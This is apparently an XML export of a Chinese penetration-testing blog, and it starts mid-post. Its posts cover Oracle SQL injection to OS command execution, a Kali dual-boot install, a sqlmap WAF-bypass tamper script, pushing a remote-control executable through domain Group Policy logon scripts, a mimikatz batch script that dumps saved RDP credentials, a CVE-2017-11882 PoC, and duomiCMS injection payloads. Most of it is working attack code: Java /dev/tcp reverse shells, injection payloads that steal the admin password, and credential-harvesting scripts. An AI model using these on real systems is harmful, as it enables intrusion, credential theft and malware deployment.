若想删除创建的函数，通过以下命令删除1drop function LinxRunCMD (4) 执行1select LinxRunCMD('id') from dual 恭喜！！！ 方法3. DBMS_JAVA_TEST.FUNCALL()使用java privileges 影响版本： 10g R2, 11g R1, 11g R2 权限：Java Permissions. 1Select DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','pwd &gt; /tmp/pwd.txt') from dual; 执行时报如下错，貌似没赋权？实际上赋权后还是一样的错误 但不影响命令的执行 该方式无回显，在注入时不太方便利用，但可通过此方式反弹 : ) 0x03 反弹shell网上铺天盖地windows的payload，linux下根本无法反弹，自己手动测试java代码反弹，然后放入oracle Sql java反弹代码如下： 12345678910111213141516import java.io.*;import java.net.*;public class shellRev&#123; public static void main(String[] args) &#123; System.out.println(1); try&#123;run();&#125; catch(Exception e)&#123;&#125; &#125;public static void run() throws Exception &#123; String[] aaa=&#123;"/bin/bash","-c","exec 9&lt;&gt; /dev/tcp/192.168.1.50/8080;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/sh"&#125;; Process p=Runtime.getRuntime().exec(aaa); &#125;&#125; 1234#编译javac shellRev.java#执行java shellRev 1. 创建java代码1select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named "shell" as import java.io.*;import java.net.*;public class shell &#123;public static void run() throws Exception&#123;String[] aaa=&#123;"/bin/bash","-c","exec 9&lt;&gt; /dev/tcp/127.0.0.1/8080;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/sh"&#125;;Process p=Runtime.getRuntime().exec(aaa);&#125;&#125;'''';END;'';END;--','SYS',0,'1',0) from dual 2. 赋予java权限1select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission( ''''''''PUBLIC'''''''', ''''''''SYS:java.net.SocketPermission'''''''', ''''''''&lt;&gt;'''''''', ''''''''*'''''''' );end;'''';END;'';END;--','SYS',0,'1',0) from dual 3. 创建函数1select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function reversetcp RETURN VARCHAR2 as language java name ''''''''shell.run() return String''''''''; '''';END;'';END;--','SYS',0,'1',0) from dual 4. 赋予函数执行权限1select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on reversetcp to public'''';END;'';END;--','SYS',0,'1',0) from dual 5. 反弹shell1select sys.reversetcp from dual 0x04 参考链接 Hacking Oracle from the WebExecute os command in Oracle DatabaseOracle Sql注入利用方法对ＸＸ站手工oracle注入到系统shell]]></content>
      <tags>
        <tag>注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[双系统安装 - win7下安装kali2.0]]></title>
    <url>%2F2018%2F04%2F19%2F%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85-win7%E4%B8%8B%E5%AE%89%E8%A3%85kali2-0%2F</url>
    <content type="text"><![CDATA[前言旧笔记本淘汰了，卖掉可惜，扔了更可惜，平时经常有破解wifi的需要，干脆把它做成双系统，win+linux两不误，由于我的华硕是UEFI+GPT，导致我双系统怎么都装不成功，由此开启了我崎岖的踩坑路。 UEFI先恶补一波BIOS，MBR，UEFI，GPT 还没弄明白BIOS+MBR和UEFI+GPT？看这一篇讲解就足够了！ EFI、UEFI、MBR、GPT的区别 UEFI+GPT与BIOS+MBR各自有什么优缺点？ 看了这些应该有了一定的认识，一般组合为： UEFI + GPT BIOS + MBR 我2012年买的华硕，已经默认是UEFI+GPT，当时还因为这个原因导致无法重装系统，现在装双系统，又碰到该问题，简直头皮发麻，不管怎么说，目的得先达到——安装双系统win+kali2.0。 步骤 几乎翻遍了百度所有双系统 词条，都无法让我成功安装，除了 rEFInd，这个我没有尝试，因为界面实在太丑了。在尝试了将近3天的方法后，依然无果，甚至把win10换到了win7，还是不能成功。当我成功完成双系统的安装后，真的是心里mmp，脸上笑嘻嘻。总结如下： 技术问题查google！ 技术问题查google！ 技术问题查google！ 三遍，你懂我意思。 Dual-boot Kali Linux Rolling 2016.2, Windows 10 on a PC with UEFI firmware 视频操作 1. 分区压缩出50g，否则安装失败，由此在知乎上回答了该问题 物理机安装kali linux时安装步骤失败？何解? 究其原因： “/ 根目录” 要分10G以上(否则安装失败,x32和x64位的系统在两台电脑上面共尝试安装了10次左右没有成功,后来成功后总结出已知原因两点1,须选图形化安装2,手工分区,而且根目录足够大,此版本解压出来/根目录就7GB以上了) 2. 刻录 UltraISO ：刻录kali2.0后安装会出错 Win32DiskImager ：可用，但是U盘会变成奇怪的格式，电脑无法打开，会提示格式化，失去了U盘的意义 选用Rufus ，kali2.0可安装且U盘可用 3. 安装一路往下走，分区时注意，选择Guided - use the largest continuous free space ，切忌不要使用手动分区，百度中所有安装kali的教程均选择手动 确认EFI系统分区后就可以done了 等待10分钟后，安装成功，否则失败参考第一步分区，GNU GRUB会被默认自动安装 重启后，bios设置启动项，默认进入win7，如需进入kali2.0，开机时ESC选择kali2.0即可（根据电脑决定，华硕为esc） 最后，晒张成功安装的图~]]></content>
      <tags>
        <tag>系统</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mysql注入 - Sqlmap之tamper编写]]></title>
    <url>%2F2018%2F03%2F28%2FMysql%E6%B3%A8%E5%85%A5-Sqlmap%E4%B9%8Btamper%E7%BC%96%E5%86%99%2F</url>
    <content type="text"><![CDATA[Bypass @ 如图，遇到@，导致注入失败，使用mysql表名即可绕过 Bypass WAF 该站存在WAF，union不可与select同时出现，简单使用%0A即可绕过，即union%0Aselect；另外information_schema.tables也被拉黑，fuzz后发现也不难绕，改为information_schema/**/.tables即可绕过。 Tamper编写这下绕过是没问题了，可惜sqlmap跑不了，遂想编写一针对此站的tamper，供sqlmap调用，但因未实现过此方式，翻看sqlmap中tamper，发现很简单，接口已经准备好，只需要对payload进行处理就能让sqlmap调用。 编写own.py放入tamper目录下即可 注意：sqlmap中的payload均是大写 1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/env python"""Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)See the file 'doc/COPYING' for copying permission"""from lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWdef dependencies(): passdef tamper(payload, **kwargs): """ Replaces space character (' ') with comments '/**/' Tested against: * Microsoft SQL Server 2005 * MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0 Notes: * Useful to bypass weak and bespoke web application firewalls &gt;&gt;&gt; tamper('SELECT id FROM users') 'SELECT/**/id/**/FROM/**/users' """ retVal = payload if payload: retVal = "" quote, doublequote, firstspace = False, False, False retVal = payload.replace('SCHEMA.', 'SCHEMA/**/.') retVal = retVal.replace('UNION ', 'UNION%0A') return retVal]]></content>
      <tags>
        <tag>注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[域渗透 - 域控下发文件并执行远控]]></title>
    <url>%2F2018%2F03%2F01%2F%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%9F%9F%E6%8E%A7%E4%B8%8B%E5%8F%91%E6%96%87%E4%BB%B6%E5%B9%B6%E6%89%A7%E8%A1%8C%E8%BF%9C%E6%8E%A7%2F</url>
    <content type="text"><![CDATA[0x01 背景内网渗透中，当控制到域控时，当然是再好不过，但如何控制成员机器或个人机呢，域管理员账号登录？太敏感，动作大；psexec,wmi..?杀软报毒，不要不信，亲身经历； 想要直接推送个远控，神不知鬼不觉的搞定成员； 那么问题来了，如何推送个exe？ 0x02 研究方法1查找大量相关资料，都没有现成的方法直接下发exe，然而吐司竟然也没有，最后，锁定了组策略开机脚本 域成员登录时，执行域控提前部署好的bat脚本，通过此脚本，IPC连接到域控，copy文件，在成员上执行。 环境： OS IP Role win2008 192.168.2.100 域控 win7 192.168.2.200 域成员 ubuntu14.04 192.168.2.250 非域成员（cs） (1) ad用户和计算机新建OU（名称任意） 新建用户（redn3ck） (2) gpmc.msc组策略管理gpmc.msc——右键组策略对象——新建（ADcontrol） 右键ADcontrol——编辑——用户配置——windows设置——脚本——登录——显示文件——新建ADControl.bat 代码如下1234net use \\192.168.2.100 p@ssw0rd /user:administrator@red.comcopy \\192.168.2.100\c$\test\mm.exe c:\test\cmd /c c:\test\mm.exenet use * /del /y 添加——浏览——选择ADControl.bat 右键OU——链接现有GPO——选择ADcontrol (3) 刷新策略1gpupdate /force (4) 重启域成员使用新建账户(redn3ck)登录，成功copy文件，并执行 方法2(1) 创建batlogon默认路径：C:\Windows\SYSVOL\sysvol\red.com\scripts 12345//logon.batnet use \\192.168.2.100 12345RDzxcvb! /user:administrator@red.comcopy \\192.168.2.100\c$\test\mm.exe c:\testcmd /c start c:\test\mm.exe (2) 执行1net user redn3ck /scriptpath:logon.bat 注：执行时需要cmd /c start否则开机会有cmd窗口 方法3Domain computer——管理——添加用户到远程管理组 0x03 总结 脚本需要放在《显示文件》目录中，其他目录成员机无法访问到，因此也就无法执行 域用户（redn3ck）在根目录均无权限，windows\temp目录可copy进去，但无法执行，因此copy时需选择有权限目录 实际环境中当然不能重启机器，只需要等待域成员账号开机登录即可]]></content>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[getPass - 一键批量获取远程终端凭据密码]]></title>
    <url>%2F2018%2F01%2F18%2FgetPass-%E4%B8%80%E9%94%AE%E6%89%B9%E9%87%8F%E8%8E%B7%E5%8F%96%E8%BF%9C%E7%A8%8B%E7%BB%88%E7%AB%AF%E5%87%AD%E6%8D%AE%E5%AF%86%E7%A0%81%2F</url>
    <content type="text"><![CDATA[前言 【奇技淫巧】破解远程终端凭据，获取服务器密码 想必大家都看了这篇文章吧，土司12月推送的，非常好的破解方式，内网中能起到相当大的作用，相信不少人已经去实践了一遍，过程之繁琐真是让我们这些人望而却步。 我可不想每拿到一台内网机，都要重复的去做这么复杂的操作，而且每一个凭据都要做一遍。 对批处理不熟，花了几天时间，写了个bat，一键批量获取。 Code123456789101112131415161718192021222324252627282930313233343536373839404142434445@echo offsetlocal enabledelayedexpansionecho.echo [+] Start. Code by redn3ck.echo.set flag=0 REM 判断是否存在Credentialsfor /f %%i in ('dir /a/s/b c:\Users\Administrator\AppData\Local\Microsoft\Credentials') do ( if exist %%i ( set file=%%i set flag=1 echo !file! for /f "delims=: tokens=1,2" %%i in ('mimikatz.exe "dpapi::cred /in:!file!" "exit" ^| findstr guidMasterKey') do set guidMasterKey=%%j REM echo !guidMasterKey! mimikatz "privilege::debug" "sekurlsa::dpapi" "exit" &gt; MasterKey.txt REM findstr /n 返回行号 example: 1: * GUID : &#123;b619a08d-f4c3-408d-b733-bc89bd94ca0b&#125; for /f "delims=:" %%i in ('findstr /n "!guidMasterKey!" MasterKey.txt') do ( set /a lineNum=%%i+1 REM echo !lineNum! call :next ) )):endif !flag!==0 echo [-] No credentials :(echo.echo [+] Endexit /b :nextfor /f "skip=%lineNum% delims=" %%i in ('type MasterKey.txt') do (set MasterKeyTemp=%%igoto next2):next2set MasterKey=%MasterKeyTemp:~16%REM echo %MasterKey%mimikatz "dpapi::cred /in:%file% /masterkey:%MasterKey%" "exit" &gt; pass.txtfindstr "TargetName UserName CredentialBlob" pass.txtdel MasterKey.txt 你只需把mimikatz和getCredentialsPass.bat放在同目录，运行bat即可一键批量获取远程终端凭据密码 Reply权限问题：当然需要高权限，毕竟你要访问高权限文件 桌面：无需有桌面，只需有shell，重定向即可，getCredentialsPass.bat &gt;&gt; test.txt TCVtcv=1]]></content>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2017-11882 POC]]></title>
    <url>%2F2017%2F11%2F21%2FCVE-2017-11882-POC%2F</url>
    <content type="text"><![CDATA[POChttps://github.com/embedi/CVE-2017-11882 如何使用，作者github里写的很清楚 附上自测gif BTW现在此漏洞被冠上全版本通杀的名号，作者也放出3个版本的视频，但我本地测试，却在2016下未成功 具体环境：win10 [10.0.16299.64] + 破解激活过的office2016]]></content>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[duomiCMS]]></title>
    <url>%2F2016%2F11%2F01%2FduomiCMS%2F</url>
    <content type="text"><![CDATA[变量覆盖导致注入 漏洞页面：\member\invitation.php 12345678910if($dm=='yq')&#123; $ccgid=$_SESSION['duomi_user_group']; $ccuid=$_SESSION['duomi_user_id']; $cc1=$dsql-&gt;GetOne("select * from duomi_member_group where gid=$ccgid"); $ccgroup=$cc1['gname']; $cc2=$dsql-&gt;GetOne("select * from duomi_member where id=$ccuid"); $ccjifen=$cc2['points']; $ccemail=$cc2['email']; $cclog=$cc2['logincount']; $ccgid，$ccuid均无任何过滤直接带入查询，由于变量覆盖导致此处两个变量均可控制 该cms采用80sec通用防注入，网上公开方法即可绕过。 利用：来到member页面，随便注册一个用户,test,登入。 123payload:http://127.0.0.1/duomicms_1.30/member/invitation.php_SESSION[duomi_user_id]=@`'` or updatexml(1, concat(0x7c, (select password from duomi_admin)), 3) and 1=@`'`&amp;_SESSION[duomi_user_group]=1 注出管理员密码 漏洞页面：\member\share.php 1234567891011121314if($dm=='index')&#123;$ccgid=$_SESSION['duomi_user_group'];$ccuid=$_SESSION['duomi_user_id'];$cc1=$dsql-&gt;GetOne("select * from duomi_member_group where gid=$ccgid");$ccgroup=$cc1['gname'];$cc2=$dsql-&gt;GetOne("select * from duomi_member where id=$ccuid");$ccjifen=$cc2['points'];$ccemail=$cc2['email'];$cclog=$cc2['logincount'];echo "开发中：";&#125; $ccgid，$ccuid，同上 123payload:http://127.0.0.1/duomicms_1.30/member/share.phpdm=index&amp;_SESSION[duomi_user_id]=1&amp;_SESSION[duomi_user_group]=@`'` or updatexml(1, concat(0x7c, (select password from duomi_admin)), 3) and 1=@`'` 漏洞页面：\member\exchange.php 123456789101112131415161718if($dm=='mybuy')&#123;$page = $_GET["page"];$pcount = 20;$row=$dsql-&gt;getOne("select count(id) as dd from duomi_buy where uid=".$uid);$rcount=$row['dd']; $page_count = ceil($rcount/$pcount); if(empty($_GET['page'])||$_GET['page']&lt;0)&#123; $page=1; &#125;else &#123; $page=$_GET['page']; &#125;$select_limit = $pcount; $select_from = ($page - 1) * $pcount.','; $pre_page = ($page == 1)? 1 : $page - 1; $next_page= ($page == $page_count)? $page_count : $page + 1 ; $dsql-&gt;setQuery("select * from duomi_buy where uid=".$uid." limit ".($page-1)*$pcount.",$pcount");$dsql-&gt;Execute('buylist'); $uid，session取值，无过滤带入查询，post提交即可覆盖该变量 123payload:http://127.0.0.1/duomicms_1.30/member/exchange.php_SESSION[duomi_user_id]=@`'` or updatexml(1, concat(0x7c, (select password from duomi_admin)), 3) and 1=@`'`]]></content>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
</search>
